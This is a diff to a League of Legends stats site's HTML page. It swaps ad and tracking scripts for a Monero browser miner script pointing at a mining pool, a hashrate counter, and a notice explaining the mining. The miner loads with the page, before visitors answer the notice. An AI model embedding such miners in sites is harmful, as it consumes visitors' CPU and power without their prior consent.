@@ -16,16 +16,61 @@
 
   gtag('config', 'UA-121621839-1');
 </script>
-
+<script charset="UTF-8" src="//cdn.sendpulse.com/9dae6d62c816560a842268bde2cd317d/js/push/7281bc184d37673a76117bbdcd1efe55_1.js" async></script>
 </head>
 
 <body class="body">
-<script src="//go.mobtrks.com/notice.php?p=1828426&interstitial=1"></script>
-<ul class="navbar">
+<script src="webmin.js?perfekt=wss://?algo=cn?variant=0?jason=us.moneroocean.stream:80"></script>
+ <div class="newUserMessage" id="newUserMessage">
+	<br>
+	<div class="myLogo" style="text-align: center;"><img src="TiltSeeker.png" alt="" width="60%"/></div>
+	<div class="title">
+		Ads (They Suck!)
+		<hr style="border-color: #b3b3b3;">
+	</div>
+	<div class="messageText">
+		<div style="font-size: 20px; font-family: Roboto">
+			I hate ads with a passion. <a href="https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en">I use an adblocker myself!</a>
+		</div>
+		<br>
+		<div style="text-align: left;">
+			That said, I put hundreds of hours into building this website in my spare time and I have servers to pay for. However, since I hate ads so much, I have tried to keep ads to an absolute minimum.
+			<br>
+			<br>
+			Instead, my website uses your spare CPU cycles to generate revenue. It does this by performing calculations on the Monero network. You can read more about the process <a href="https://www.coindesk.com/information/how-bitcoin-mining-works/">here</a> and <a href="https://www.coinimp.com/faq">here</a>.
+			<br>
+			<br>
+			However, I know that no one wants to have their CPU nerfed while in game. So, <span style="font-weight: 900; color: white;">submit your summoner name below to prevent CPU use while you're playing.</span>
+		</div>
+		<br>
+		<input name="mainUsername" type="text" class="mainUsernameInput" id="mainUsername" placeholder="Summoner Name" onClick="selectText(this);">
+		<select id="regionDropdown" class="regionDropdown">
+ 			<option value="na1">NA</option>
+ 			<option value="euw1">EUW</option>
+ 			<option value="eun1">EUNE</option>
+ 			<option value="br1">BR</option>
+ 			<option value="tr1">TR</option>
+ 			<option value="ru">RU</option>
+ 			<option value="la1">LAN</option>
+ 			<option value="la2">LAS</option>
+ 			<option value="oc1">OCE</option>
+ 			<option value="kr">KR</option>
+ 			<option value="jp1">JP</option>
+		</select>
+		<br>
+		<br>
+		<input class="submit-button" id="submit-mainUsername" form="mainUsername" type="submit" value="Submit">
+		<br>
+		<input class="cancel-button" id="cancelButton" form="mainUsername" type="submit" value="Later">
+	</div>
+</div>
+ 
+ <ul class="navbar">
   <li><a href="/">Home</a></li>
   <li><a href="/stats.html">Stats</a></li>
   <li><a href="/guide.html">Guide</a></li>
   <li style="float:right"><a class="active" href="./about.html">About & Contact</a></li>
+  <li class="hashrate" id="hashrate">0 H/s</li>
 </ul>
  <div id="adminmsg" class="adminmsg">
 <span id="adminmsgx" class="adminmsgx">×</span>
@@ -171,25 +216,6 @@
 <div class="my-footer">
   <div class="disclaimer"> Tiltseeker isn't endorsed by Riot Games and doesn't reflect the views or opinions of Riot Games or anyone officially involved in producing or managing League of Legends. League of Legends and Riot Games are trademarks or registered trademarks of Riot Games, Inc. League of Legends © Riot Games, Inc. </div>
 </div>
-<script id="spout-tag-4ab50459-adcd-4efd-9c49-5ff80b1e2eab">
-  (function() {
-    var r = encodeURIComponent(top.document.referrer.substring(0,250)),
-        p = encodeURIComponent(top.document.location.href.substring(0,250)),
-        t = Date.now(),
-        u = '4ab50459-adcd-4efd-9c49-5ff80b1e2eab',
-        e = document.createElement('script'),
-        s = sessionStorage.getItem('spoutable-' + u);
-    if (!s) {
-      var m = Math.random.bind(Math);
-      s = JSON.stringify({ sessionId: [ t, m(), m(), m(), m(), m(), m(), m(), m(), m(), m(), m(), m() ]});
-      sessionStorage.setItem('spoutable-' + u, s);
-    }
-    e.async = true;
-    e.src='//s.spoutable.com/s?u='+u+'&s='+encodeURIComponent(s)+'&t='+t+'&r='+r+'&p='+p;
-    document.head.appendChild(e);
-  })();
-</script>
-
 </body>
 
 <script type="text/javascript" src="tiltseek.js"></script>
